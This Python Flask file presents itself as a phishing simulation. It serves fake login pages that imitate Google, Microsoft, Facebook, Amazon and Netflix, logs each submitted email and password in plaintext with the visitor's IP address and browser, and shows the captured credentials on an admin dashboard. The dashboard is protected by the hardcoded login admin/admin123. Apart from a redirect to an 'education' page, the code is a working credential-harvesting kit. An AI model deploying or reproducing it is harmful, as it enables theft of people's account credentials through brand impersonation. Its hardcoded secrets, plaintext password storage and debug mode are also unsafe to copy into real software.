from flask import Flask, render_template, request, redirect, url_for, session
import datetime
import os
from collections import defaultdict
import json

app = Flask(__name__)
app.secret_key = "phish_sim_secret_key_change_in_production"

def get_stats():
    """Calculate real statistics from captured data"""
    stats = {
        'total_attempts': 0,
        'success_rate': 0,
        'unique_ips': 0,
        'today_attempts': 0
    }
    
    if not os.path.exists('captured_data.txt'):
        return stats
    
    unique_ips = set()
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    today_count = 0
    total_count = 0
    
    try:
        with open('captured_data.txt', 'r') as f:
            for line in f:
                if line.strip():
                    total_count += 1
                    parts = line.strip().split(', ')
                    
                    # Extract IP
                    for part in parts:
                        if part.startswith('IP: '):
                            ip = part.replace('IP: ', '')
                            unique_ips.add(ip)
                            break
                    
                    # Check if today's attempt
                    for part in parts:
                        if part.startswith('Time: '):
                            timestamp = part.replace('Time: ', '')
                            if timestamp.startswith(today):
                                today_count += 1
                            break
        
        stats['total_attempts'] = total_count
        stats['unique_ips'] = len(unique_ips)
        stats['today_attempts'] = today_count
        # Assuming 100% success rate for captured credentials
        stats['success_rate'] = 100 if total_count > 0 else 0
        
    except Exception as e:
        print(f"Error calculating stats: {e}")
    
    return stats

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        browser_data = request.form.get('browserData', '')
        ip = request.remote_addr
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Parse browser data if available
        user_agent = ''
        if browser_data:
            try:
                browser_info = json.loads(browser_data)
                user_agent = browser_info.get('userAgent', '')
            except:
                pass
        
        with open('captured_data.txt', 'a') as f:
            f.write(f"Email: {email}, Password: {password}, IP: {ip}, Time: {timestamp}, UserAgent: {user_agent}\n")
        
        return redirect(url_for('education'))
    
    return render_template('login.html')

@app.route('/education')
def education():
    return render_template('education.html')

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    error = None
    if request.method == 'POST':
        if request.form.get('username') == 'admin' and request.form.get('password') == 'admin123':
            session['logged_in'] = True
            return redirect(url_for('admin'))
        else:
            error = 'Invalid credentials'
    return render_template('admin_login.html', error=error)

@app.route('/admin')
def admin():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    data = []
    try:
        with open('captured_data.txt', 'r') as f:
            for line in f:
                if line.strip():
                    parts = line.strip().split(', ')
                    email = parts[0].replace('Email: ', '') if len(parts) > 0 else 'Unknown'
                    password = parts[1].replace('Password: ', '') if len(parts) > 1 else 'Unknown'
                    ip = parts[2].replace('IP: ', '') if len(parts) > 2 else 'Unknown'
                    time = parts[3].replace('Time: ', '') if len(parts) > 3 else 'Unknown'
                    user_agent = parts[4].replace('UserAgent: ', '') if len(parts) > 4 else 'Unknown'
                    
                    # Truncate long user agents for display
                    if len(user_agent) > 50:
                        user_agent = user_agent[:50] + '...'
                    
                    data.append([email, password, ip, time, user_agent])
    except FileNotFoundError:
        pass
    
    # Get real statistics
    stats = get_stats()
    
    return render_template('admin.html', data=data, stats=stats)

@app.route('/admin/clear_data', methods=['POST'])
def clear_data():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    try:
        if os.path.exists('captured_data.txt'):
            os.remove('captured_data.txt')
    except Exception as e:
        print(f"Error clearing data: {e}")
    
    return redirect(url_for('admin'))

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/template/<template_name>', methods=['GET', 'POST'])
def phishing_template(template_name):
    if request.method == 'POST':
        # Handle form submission similar to login route
        email = request.form.get('email')
        password = request.form.get('password')
        browser_data = request.form.get('browserData', '')
        ip = request.remote_addr
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open('captured_data.txt', 'a') as f:
            f.write(f"Email: {email}, Password: {password}, IP: {ip}, Time: {timestamp}, Template: {template_name}\n")
        
        return redirect(url_for('education'))
    
    templates = {
        'google': 'login.html',
        'microsoft': 'microsoft_login.html',
        'facebook': 'facebook_login.html',
        'amazon': 'amazon_login.html',
        'netflix': 'netflix_login.html'
    }
    
    if template_name in templates:
        return render_template(templates[template_name])
    else:
        return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True)
